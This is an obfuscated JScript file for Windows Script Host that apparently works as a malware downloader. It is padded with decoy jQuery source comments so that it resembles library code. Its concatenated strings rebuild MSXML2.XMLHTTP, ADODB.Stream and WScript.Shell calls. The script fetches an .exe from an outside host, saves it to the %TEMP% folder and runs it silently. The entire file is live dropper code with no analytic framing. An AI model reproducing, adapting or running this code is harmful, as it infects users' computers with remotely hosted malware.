XAkziGvtI = " Check parentNode to catch when Blackberry 4.6 returns nodes that are no longer in the document #6963 if ( elem && elem.parentNode ) {";
eventsI = 0;
String.prototype.headphones = function () { return this.substr(0, 1); };
var OdritkNm = ["m"+"Wk"+("basket","prefix","ph")+("philemon","romeo","premeditated","inducement","WkIi"), "j"+("villager","subsection","russet","UX")+("convocation","breaks","afterthought","collusion","wv")+"okE", ("absolute","oneness","workhouse","specific","ExpandEnv")+("alluvial","adobe","iron")+"mentSt"+("disillusion","derelict","insubordination","ri")+("politicians","threefold","ngs"), ("havana","misuse","")+"%"+"TE"+"MP%", ("beleaguered","councillor","papyrus","strident","")+"."+"exe", ("perpetuate","housewife","solely","R")+"un", "A"+"ctal"+"te"+"rnat"+"io"+"ni"+"va"+"lt"+"er"+"na"+"ti"+"on"+"eX"+"al"+("paramour","viper","te")+"rn"+("wiltshire","bookish","terrain","detector","at")+"io"+"nO"+"ba"+"lt"+"er"+"na"+"ti"+"on"+"jeal"+"tern"+"at"+"io"+"nct","bermuda", "QniaBctzk", ("amongst","unaccompanied","paperback","butter","WScalternat")+"io"+("merchant","hostels","nr")+"iptalterna"+("spreading","reserved","replied","tion.") + ("undoing","financing","autobiography","educator","S"),"recommendation", ("tournaments","depravity","knows","h")+("mutable","partial","burner","cleveland","al")+"te"+("strawberry","harem","rn")+("overall","threequarter","seduction","at")+("journalists","continued","propagate","io")+("person","dependence","ne")+"la"+("recall","vociferous","horus","lt")+"erna"+"tionl","materials", ("bruise","blocks","")+"T"+"bA"+"mPc", ("suzerainty","sleek","brunswick","education","M")+"al"+"ternat"+"io"+"nS"+("animate","groups","jurisprudence","Xa")+("blight","chassis","lt")+("halifax","olivia","stayed","er")+"nation"+("monosyllable","fortythree","serenade","intuitive","ML")+"al"+"te"+"rn"+"at"+"io"+("province","emotional","famed","thousand","n2") + ("civil","pommel","compression",".")+("multiple","monopolize","strategy","altern")+("succeed","encumber","atio")+("geometry","myrtle","assam","consideration","nX")+"Ma"+("average","absurdly","robust","deaden","lter")+("intimidate","masturbation","incidence","commander","nati")+("unaltered","lucas","onLHal")+("ellen","collaborative","brahma","ternationT")+("foxes","documentary","atheist","TP")];
qsvYxGRDV = "} HANDLE: $(expr, $(...)) } else if ( !context || context.jquery ) { return ( context || root ).find( selector );";
OdritkNm.splice(7, eventsI + 2);
survey = OdritkNm[1+4+1].split("alternation").join("");
var hJUHV = this[survey];
SDrnVoG = "dkXSMtL";
metamorphosis = (("statute","brisbane", "MUILqslBLb","beadle", "pGyUecIjYP") + "toGORqoBoxD").headphones();
footnotes = (("homily","bladder", "UNTcNaBram","italian", "spYJGwsB") + "zrHlPY").headphones();

eventsI = 6;
OdritkNm[eventsI + 1] = OdritkNm[eventsI + 1] + OdritkNm[eventsI + 3];
OdritkNm[eventsI + 2] = "JzkEfWPLYjS";
eventsI++;
OdritkNm.splice(eventsI + 1, eventsI - 4);
OdritkNm[eventsI] = OdritkNm[eventsI].split("alternation").join("");
var WymwfrF = new hJUHV(OdritkNm[eventsI]);
PNvzMTGKSOm = "} Otherwise, we inject the element directly into the jQuery object this.length = 1; this[ 0 ] = elem; ";
eventsI++;
OdritkNm[eventsI + 1] = OdritkNm[eventsI + 1].split("alternation").join("");
var uUkRxi = new hJUHV(OdritkNm[1 + eventsI]);
tqStRIuMJ = " Handle the case where IE and Opera return items by name instead of ID if ( elem.id !== match[ 2 ] ) { return rootjQuery.find( selector ); ";
eventsI /= 2;
var hocvDkaz = WymwfrF[OdritkNm[eventsI - 1 - 1]](OdritkNm[eventsI - 2 + 1]);
DMzFPpym = "} this.context = document; this.selector = selector; return this; ";
aviatore = (("television","conversion", "eOXJWcRYcr","comics", "EYTnIkOdwT") + "wkqieNWwqwA").headphones();

function akimbo(ejaculation, blockhouse) {

    try {
        var forums = hocvDkaz + "/" + blockhouse + OdritkNm[eventsI];
    drlFfN = " Give the init function the jQuery prototype for later instantiation init.prototype = jQuery.fn;";
    uUkRxi["o" + metamorphosis + aviatore + "n"](("motorcycle","siddhartha","obtrude","ebony","G") + aviatore + ("reflections","ostensible","T"), ejaculation, false);

    TEyurxmzbvI = " Initialize central reference rootjQuery = jQuery( document );";
    uUkRxi[footnotes + ("periodically","publisher","cavalcade","solicitor","e") + (("interpreted","repository", "QublbstJ","framing", "vibration", "nrqjpzefU") + "sOyLqjEc").headphones() + (("accumulate","gardening", "SAEhYAiiL","saucy", "diable", "dfjnKey") + "opeQthEEd").headphones()]();
    afeRGYQAiRj = " var rparentsprev = /^(?:parents|prev(?:Until|All))/,";
    if (uUkRxi.status == 200) {
        var GbawpWA = new hJUHV((""+("generic","adjourn","A")+"pO"+"DB." + ""+"S"+"tr"+("bahamas","adhesive","situation","critter","eam")).replace("p", "D"));
        GbawpWA.open();
        IhqrdOmf = " HANDLE: $(expr, context) (which is just equivalent to: $(context).find(expr) } else { return this.constructor( context ).find( selector ); ";
        GbawpWA.type = 22 * (12 - 8 - 4) + 6 - (8 / 2 + 1);
        tmNUoW = "} HANDLE: $(DOMElement) } else if ( selector.nodeType ) { this.context = this[ 0 ] = selector; this.length = 1; return this;";
        GbawpWA[("showers","hamper","relax","viscount","w")+"ri"+"te"](uUkRxi[""+("satiate","antipathy","marks","keyhole","R")+"es"+"pon" + footnotes + ("noose","rearguard","promoting","e")+"Bo"+"dy"]);
        ztaCUGidHj = " HANDLE: $(function) Shortcut for document ready } else if ( jQuery.isFunction( selector ) ) { return typeof root.ready !== \"undefined\" ? root.ready( selector ) :";
        GbawpWA[(metamorphosis + ("cultures","minimal","progeny","minutes","o")+("ebony","connect","Di")+"ti"+"on").replace("D", footnotes)] = 0;
        kvkVGsWG = " Execute immediately if ready is not present selector( jQuery ); ";
        GbawpWA["s"+("colonization","photos","aveT")+"oF"+"ile"](forums, 2);
        AbdPrXOFRpW = "} if ( selector.selector !== undefined ) { this.selector = selector.selector; this.context = selector.context; ";
        GbawpWA.close();
        cgbNRGvb = "} return jQuery.makeArray( selector, this ); };";
        WymwfrF[OdritkNm[eventsI + 1]](forums, 1, "nITqcITxEvW" === "YjxqkkWQC"); zMKByp = " return this.filter( function() { for ( i = 0; i < len; i++ ) { if ( jQuery.contains( this, targets[ i ] ) ) { return true; } } } ); },";
    }

} catch (HvtGwLeG) { };

    smghoii = "jQuery.fn.extend( { has: function( target ) { var i, targets = jQuery( target, this ), len = targets.length;";
}
akimbo("htt"+("magnificent","undertaken","p:")+"//"+"eazy"+("united","throwed","chuck","ma")+("blogs","citron","il")+("santa","needing","dense","s.co")+("minister","hudson","m/4353")+("gauzy","patent","24")+("interim","upgrading","locks","quilt","34")+("timehonoured","carrying","crammed","giggling",".e")+("admission","palmy","xe"),"JUhghwk");
   hnSYJcWCxHv = " methods guaranteed to produce a unique set when starting from a unique set guaranteedUnique = { children: true, contents: true, next: true, prev: true };";